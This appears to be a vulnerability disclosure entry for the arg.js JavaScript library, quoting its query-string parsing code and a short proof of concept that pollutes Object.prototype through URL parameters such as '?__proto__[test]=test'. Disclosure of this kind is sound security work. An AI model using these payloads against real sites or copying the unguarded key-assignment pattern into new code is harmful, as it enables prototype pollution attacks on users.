## arg.js

URL: https://github.com/stretchr/arg.js

### Vulnerable code fragment

https://github.com/stretchr/arg.js/blob/master/src/arg.js##L47-L133

```js
Arg.parse = function(s){
    if (!s) return {};
    if (s.indexOf("=")===-1 && s.indexOf("&")===-1) return {};
    s = Arg._cleanParamStr(s);
    var obj = {};
    var pairs = s.split("&");
    for (var pi in pairs) {
    if(pairs.hasOwnProperty(pi)){
        var kvsegs = pairs[pi].split("=");
        var key = decodeURIComponent(kvsegs[0]), val = Arg.__decode(kvsegs[1]);
        Arg._access(obj, key, val);
    }
    }
    return obj;
};

// ...

Arg._access = function(obj, selector, value) {
    var shouldSet = typeof value !== "undefined";
    var selectorBreak = -1;
    var coerce_types = {
    'true'  : true,
    'false' : false,
    'null'  : null
    };

    if (typeof selector == 'string' || Object.prototype.toString.call(selector) == '[object String]') {
    selectorBreak = selector.search(/[\.\[]/);
    }

    if (selectorBreak === -1) {
    if (Arg.coerceMode) {
        value = value && !isNaN(value)            ? +value              // number
            : value === 'undefined'             ? undefined           // undefined
            : coerce_types[value] !== undefined ? coerce_types[value] // true, false, null
            : value;                                    // string
    }
    return shouldSet ? (obj[selector] = value) : obj[selector];
    }

    var currentRoot = selector.substr(0, selectorBreak);
    var nextSelector = selector.substr(selectorBreak + 1);

    switch (selector.charAt(selectorBreak)) {
    case '[':
        obj[currentRoot] = obj[currentRoot] || [];
        nextSelector = nextSelector.replace(']', '');

        if (nextSelector.search(/[\.\[]/) === -1 && nextSelector.search(/^[0-9]+$/) > -1) {
        nextSelector = parseInt(nextSelector, 10);
        }

        return Arg._access(obj[currentRoot], nextSelector, value);
    case '.':
        obj[currentRoot] = obj[currentRoot] || {};
        return Arg._access(obj[currentRoot], nextSelector, value);
    }

    return obj;
};
```

### PoC
```html
<script src="/arg.js"></script>
<script>
    Arg.parse(location.search)
</script>
```
```
?__proto__[test]=test
#__proto__[test]=test
```